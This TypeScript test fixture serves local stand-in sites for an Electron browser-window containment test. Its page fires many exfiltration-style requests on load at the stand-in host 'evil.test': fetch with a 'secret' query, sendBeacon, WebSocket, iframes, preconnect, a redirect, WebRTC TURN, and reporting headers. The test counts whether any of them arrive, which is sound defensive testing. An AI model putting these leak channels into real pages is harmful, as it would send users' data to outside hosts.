// Local stand-ins for the sites of tests/browser-window-electron.test.ts. `op.test` (the operated
// site), `assets.test` (its parts host) and `untrusted.test` share one HTTPS server; `evil.test`,
// the place nothing may reach, has a server of its own so that every TCP connection to it counts
// (a preconnect or WebRTC's TCP opens one without any HTTP request), and a UDP socket stands for a
// STUN server. The harness maps the names to them with Chromium's `host-rules`.
import dgram from 'node:dgram'
import fs from 'node:fs'
import https from 'node:https'
import path from 'node:path'

export interface Hit { host: string; method: string; path: string; body: string }

const page = (udpPort: number) => `<!doctype html><meta charset="utf-8"><title>operated page</title>
<link rel="stylesheet" href="https://assets.test/a.css">
<link rel="preconnect" href="https://evil.test">
<link rel="dns-prefetch" href="https://evil.test">
<link rel="preload" as="fetch" href="https://evil.test/preload" crossorigin>
<script src="https://assets.test/a.js"></script>
<img src="https://assets.test/a.png">
<a id="popup" href="https://evil.test/popup" target="_blank">popup</a>
<a id="js" href="javascript:location='https://evil.test/js'">js</a>
<a id="nav" href="https://evil.test/nav">nav</a>
<a id="redirect-nav" href="/redirect-evil">redirect</a>
<a id="download" href="/file.csv" download>download</a>
<a id="download-evil" href="https://evil.test/file.csv" download>download elsewhere</a>
<form id="form" method="post" action="/ai-form"><input name="a" value="1"></form>
<script>
  // Everything below runs on load: none of it may reach evil.test, nor assets.test beyond its parts.
  fetch('https://evil.test/fetch?d=secret').catch(() => {})
  try { const x = new XMLHttpRequest(); x.open('GET', 'https://evil.test/xhr'); x.send() } catch {}
  new Image().src = 'https://evil.test/img'
  navigator.sendBeacon('https://evil.test/beacon', 'x')
  try { new WebSocket('wss://evil.test/ws') } catch {}
  const frame = document.createElement('iframe'); frame.src = 'https://evil.test/iframe'; document.body.appendChild(frame)
  const assetFrame = document.createElement('iframe'); assetFrame.src = 'https://assets.test/frame'; document.body.appendChild(assetFrame)
  fetch('https://assets.test/data.json').catch(() => {})
  fetch('https://assets.test/post', { method: 'POST', body: 'x', mode: 'no-cors' }).catch(() => {})
  fetch('/redirect-evil').catch(() => {})
  fetch('http://op.test/plain').catch(() => {})
  // WebRTC: STUN over UDP to an address, TURN over TCP to a name.
  try {
    const pc = new RTCPeerConnection({ iceServers: [
      { urls: 'stun:127.0.0.1:${udpPort}' },
      { urls: 'turn:evil.test:443?transport=tcp', username: 'u', credential: 'c' },
    ] })
    pc.createDataChannel('x')
    pc.createOffer().then(o => pc.setLocalDescription(o))
  } catch {}
</script>`

const WORKER = `fetch('/ai-worker', { method: 'POST', body: 'w' }).then(r => postMessage(r.status), () => postMessage('refused'))`

export interface Sites {
  hits: Hit[]
  /** TCP connections that reached evil.test's server (with or without an HTTP request). */
  evilConnections: number
  /** UDP datagrams that reached the STUN stand-in. */
  udpPackets: number
  close(): void
}

export async function startSites(certDir: string, ports: { site: number; evil: number; udp: number }): Promise<Sites> {
  const tls = { key: fs.readFileSync(path.join(certDir, 'key.pem')), cert: fs.readFileSync(path.join(certDir, 'cert.pem')) }
  const state: Sites = { hits: [], evilConnections: 0, udpPackets: 0, close: () => {} }
  const record = (req: import('node:http').IncomingMessage, body: string) =>
    state.hits.push({ host: (req.headers.host ?? '').split(':')[0], method: req.method ?? '', path: req.url ?? '/', body })

  const server = https.createServer(tls, (req, res) => {
    let body = ''
    req.on('data', chunk => { body += chunk })
    req.on('end', () => {
      record(req, body)
      const host = (req.headers.host ?? '').split(':')[0]
      const url = req.url ?? '/'
      if (host === 'op.test' && url === '/') {
        res.setHeader('content-type', 'text/html; charset=utf-8')
        // Reporting endpoints elsewhere: the window must neither keep them nor send to them.
        res.setHeader('Report-To', JSON.stringify({ group: 'g', max_age: 3600, endpoints: [{ url: 'https://evil.test/report' }] }))
        res.setHeader('NEL', JSON.stringify({ report_to: 'g', max_age: 3600, success_fraction: 1, failure_fraction: 1 }))
        res.setHeader('Reporting-Endpoints', 'e="https://evil.test/report2"')
        res.end(page(ports.udp))
        return
      }
      if (url === '/worker.js') { res.setHeader('content-type', 'text/javascript'); res.end(WORKER); return }
      if (url.startsWith('/redirect-evil')) { res.writeHead(302, { location: 'https://evil.test/redirected' }); res.end(); return }
      if (url === '/file.csv') { res.setHeader('content-type', 'text/csv'); res.setHeader('content-disposition', 'attachment; filename="file.csv"'); res.end('a,b'); return }
      if (url.endsWith('.css')) res.setHeader('content-type', 'text/css')
      else if (url.endsWith('.js')) res.setHeader('content-type', 'text/javascript')
      else if (url.endsWith('.png')) res.setHeader('content-type', 'image/png')
      res.setHeader('access-control-allow-origin', '*')
      res.end(url.endsWith('.js') ? 'window.assetScript = true' : 'ok')
    })
  })
  // A WebSocket handshake reaching the server counts as a hit; it is never accepted.
  server.on('upgrade', (req, socket) => { record(req, ''); socket.destroy() })

  const evil = https.createServer(tls, (req, res) => {
    let body = ''
    req.on('data', chunk => { body += chunk })
    req.on('end', () => { record(req, body); res.end('evil') })
  })
  evil.on('connection', () => { state.evilConnections++ })
  evil.on('upgrade', (req, socket) => { record(req, ''); socket.destroy() })
  evil.on('tlsClientError', () => {})

  const udp = dgram.createSocket('udp4')
  udp.on('message', () => { state.udpPackets++ })

  await Promise.all([
    new Promise<void>(resolve => server.listen(ports.site, '127.0.0.1', () => resolve())),
    new Promise<void>(resolve => evil.listen(ports.evil, '127.0.0.1', () => resolve())),
    new Promise<void>(resolve => udp.bind(ports.udp, '127.0.0.1', () => resolve())),
  ])
  state.close = () => { server.close(); evil.close(); udp.close() }
  return state
}
